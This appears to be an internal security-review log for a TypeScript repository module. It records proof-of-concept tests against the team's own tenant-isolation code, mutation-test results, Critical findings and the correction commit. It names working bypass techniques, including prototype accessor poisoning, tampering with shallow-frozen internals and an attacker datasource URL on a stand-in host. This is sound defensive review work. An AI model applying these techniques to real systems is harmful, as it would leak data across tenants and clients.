# Task 3 — third scoped review of `000a626..9249fb2`, and the correction

Evidence recorded at checkpoint on 2026-07-31. The review itself ran in a
separate agent context; everything below existed only in that conversation and
is written here so it survives.

**Scope reviewed:** exactly one commit, `9249fb2`, +69 lines across 4 files.
Isolated by user decision: "correção de Critical se revisa sozinha — o ciclo
anterior mostrou que sua primeira tentativa de C-2 parecia certa e não era, e
diff maior dilui a atenção justamente onde ela importa."

**Verdict: NOT CLOSED.**

The attack the second review named (`Object.create(prototype)` plus property
assignment) was genuinely dead on both paths. The property C-2 was meant to
establish — no data access except through `createPrismaObservationRepository` —
was still broken three ways, two of them needing no reflection at all.

Root cause: TypeScript `private` is erased at runtime.
`Object.keys(bundle.observations)` returned `["database","writer"]`.

## Attacks attempted

PoCs were run as real vitest files against the production module.

| # | Attack | Result |
|---|---|---|
| A1 | `Object.create(proto)` + `database` → `find()` | blocked — `PRISMA_REPOSITORY_CONSTRUCTION_FORBIDDEN` |
| A2 | `Object.create(proto)` + `writer` → `save()` | blocked, `persistedCount: 0` |
| A3 | Detached `proto.find` + `Reflect.apply` on forged `this` | blocked |
| A4 | `Object.setPrototypeOf(forged, proto)` | blocked |
| A5 | `Reflect.construct` with foreign `new.target` | blocked |
| A6 | `class Evil extends Repo` with forged authority | blocked |
| A7 | Spread copy of a legit instance + re-prototype | blocked |
| A8 | `structuredClone(legitInstance)` | blocked (DOMException, by chance) |
| A10 | Mutate own props of a legit frozen instance | blocked (TypeError on all three forms) |
| **A11** | `legit.database.client = attackerClient` | **BROKEN** — `find()` returned `{"leaked":"OTHER_TENANT_ROW"}`; `Object.freeze` is shallow |
| **A12** | `legit.writer.database = attackerDb` | **BROKEN** — `save()` diverted, `sinkCount: 1` |
| **A13** | `createPrismaObservationRepository("postgresql://attacker@evil.example:5432/loot")` | **BROKEN** — factory-issued repository over the attacker's datasource |
| **A16** | Prototype accessor poisoning of `database`, then call the real factory | **BROKEN — full bypass**; `isFrozen: true`, `guardThrew: false`, returned `ROW_FROM_ATTACKER_DB_NO_RLS` |
| **A17** | Prototype accessor poisoning of `writer` | **BROKEN** — `sinkCount: 1` |
| **A18** | Swap internals *after* `Object.freeze` via the poisoned prototype cell | **BROKEN** — `swappedAfterFreeze: true` |
| A19 | Control: guarded `find()` on an out-of-wallet row | correct, `null` |
| **A20** | `bundle.observations.writer.find(principal, operation, id)` | **BROKEN — cross-wallet leak**, returned `payload: {visibility:"wallet-b-ONLY"}` |
| **A21** | `bundle.observations.database.findAuthorized("tenant-a","wallet-b",id)` | **BROKEN — zero authorization**, no principal, caller-chosen `tenantId` fed to `set_config` |
| A22 | Is `this.database = database` assigned before the authority check? | yes — `assignedBeforeThrow: true` |
| A9 | `new Proxy(legitInstance, {})` then `find()` | throws; breaks legitimate wrappers (Minor) |
| A14 | Recover `repositoryConstructionAuthority` from public surface | not recoverable — but unnecessary given A16 |

## Mutation results on the reviewed commit (ADR 019)

| # | Guard | Suite | Killing test |
|---|---|---|---|
| M1 | `assertFactoryIssuedRepository(this)` in `save()` | 1 failed | `refuses to write through a repository instance that never ran the factory constructor` |
| M2 | same in `find()` | 1 failed | `refuses to read from a repository instance that never ran the factory constructor` |
| **M3** | **`Object.freeze(this)`** | **44 passed** | **SURVIVED — ADR 019 violation** |
| M4 | `assertDevelopmentEnvironment()` in `assertDevelopmentIssuer` | 1 failed | `stops issuing principals when the environment leaves development after construction` |
| M5 | `optedInDevelopmentProviders.has(candidate)` | 1 failed | `refuses to issue a principal from an instance that never ran the opt-in constructor` |
| M6 | `candidate instanceof DevInsecureIdentityProvider` | 44 passed | SURVIVED — expected; confirms the WeakSet is the control and the comment is truthful |
| M7 | Constructor authority check | 1 failed | `refuses to construct the authorized repository outside its factory` |

The commit's own claim about M4 was confirmed exactly: the per-call environment
re-check now fails precisely one test, and it is the new one. The pre-existing
detached-method test could never have killed it, because it calls with
`this === undefined`, so the WeakSet clause throws first. That was a real
coverage hole and `9249fb2` genuinely closed it.

## Findings

- **C-4 (Critical)** — cross-wallet leak inside one tenant. `writer` and
  `database` are enumerable own properties of the object handed to callers.
  `TransactionalTenantScopedRepository.find` performs a valid
  `assertReadOperation` and then calls `findUnique({where:{id}})` with **no
  wallet predicate**, re-checking only the tenant. Both rows are the same
  tenant, so RLS sees nothing wrong — which per ADR 020 is the forbidden
  justification, not a mitigation.
- **C-5 (Critical)** — `bundle.observations.database.findAuthorized(...)` runs
  with no principal and no operation, and its `tenantId` argument is what
  reaches `set_config('app.tenant_id', …)`, so the caller chooses which tenant
  RLS will admit.
- **C-6 (Critical)** — prototype accessor poisoning. `database` was a parameter
  property, so `this.database = database` is an *assignment* that hits a planted
  setter; the field never becomes an own property, `Object.freeze(this)` freezes
  an object that no longer owns it, and the instance is registered in the
  WeakSet. It passes every per-call guard while reading attacker storage.
- **I-1 (Important)** — `Object.freeze(this)` did not do what its comment
  claimed (shallow), and M3 showed nothing tested it.
- **I-2 (Important)** — the factory accepted an arbitrary database URL string,
  walking around the entire authority apparatus.
- **Minor** — `new Proxy(instance, {})` breaks under the per-call check;
  `candidate as never` is a type-level smell; parameter-property assignment
  precedes the authority throw.

## Out of scope, flagged by the reviewer

- The repositories module has **no consumer** anywhere in the repo other than
  its own test file, and `packages/adapters/package.json` exports only
  `./identity-middleware` and `./keycloak`. The Criticals are therefore not
  reachable from a deployed entry point today. Verified independently.
- `TransactionalTenantScopedRepository` has a fully public constructor with no
  authority check — same shape C-2 spent three commits closing.

## Correction — `d6e135d`

RED observed for each. ECMAScript `#` fields replace erased `private` on all
four repository classes; prototypes frozen; factory takes no arguments; the
wallet-blind reader refuses a record carrying `debtorId`.

The architectural test added over the repository classes also caught `records`
exposed on both in-memory repositories, where reading it skipped every
principal, operation and wallet check. That was not in the review.

RED evidence, `packages/adapters`:

```
expected [ 'database', 'writer' ] to deeply equal []
expected { leaked: 'ATTACKER_DATABASE' } to deeply equal { value: 'public-source-fact' }
expected [Function] to throw an error          (factory url)
expected [ 'records' ] to deeply equal []                       (InMemoryTenantScopedRepository)
expected [ 'walletContainsDebtor', 'records' ] to deeply equal []
expected [ 'database' ] to deeply equal []                      (TransactionalTenantScopedRepository)
promise resolved "{ id: 'observation-a', …(3) }" instead of rejecting  (debtor-scoped leak)
```

Mutation matrix after the correction — each guard kills exactly one test:

| Mutation | Killing test |
|---|---|
| delete `Object.freeze(prototype)` | `refuses to replace a data method on the class prototype` |
| delete `Object.freeze(this)` | `refuses to shadow a data method on the issued repository instance` |
| revert `#database` to a public own property | `keeps the transactional writer and the database unreachable` |

**Two defects in the correction's own tests were caught by that matrix and
fixed before commit.** The instance-freeze test passed for the wrong reason: with
the prototype frozen, assignment already throws because the inherited property
is non-writable, so it never exercised `Object.freeze(this)` — it now uses
`Object.defineProperty`, the only path that reaches it. The prototype test
corrupted shared state when it failed, taking five unrelated tests with it; it
now restores the descriptor in a `finally`.

## Decisions taken by the user during this range

- I-1 of the second review ("find returning a foreign tenant") was reclassified
  from Important to **Critical**: a leak between clients is not an Issue, and
  "RLS still catches it" inverts ADR 020.
- **I-2 (HUMAN wallet scope), resolution agreed but deliberately not
  implemented:** wallet scope applies to every actor kind including HUMAN, since
  the `AGENTS.md` invariant beats an ambiguous ADR; broad `admin_tenant` access
  is modelled as an **explicit grant evaluated per wallet**, never as skipping
  the check, because a grant is auditable and the branching `if` is not. ADR 008
  is to be amended. Superseded on 2026-07-31 by the deadline decision that moved
  it to the pendency list, but the resolution stands for whoever closes it.
- **I-5 (identity resolution), resolution agreed but not implemented:** global
  unique `(provider, subject)`, **no `SECURITY DEFINER`** — no RLS exception
  inside the slice whose purpose is isolation. `ActorIdentity` becomes a
  bootstrap table outside RLS scope, holding only provider, subject, tenant and
  roles, with the conscious limitation that **one identity belongs to exactly
  one tenant**. Natural if each tenant has its own realm/issuer. Exit path: when
  ADR 021 closes with token verification, the tenant comes from a verified claim
  and the lookup disappears.
- Two Minors were reclassified as security: the dead ESLint rule (a rule that
  never fires is worse than none, because it manufactures confidence) and the
  missing `NODE_ENV` in Compose (the fail-closed guarantee must not rest on an
  undefined value).
- Slice 3 closes on Criticals only; everything else becomes a documented
  pendency list. Execution goes inline from Task 4 onward.
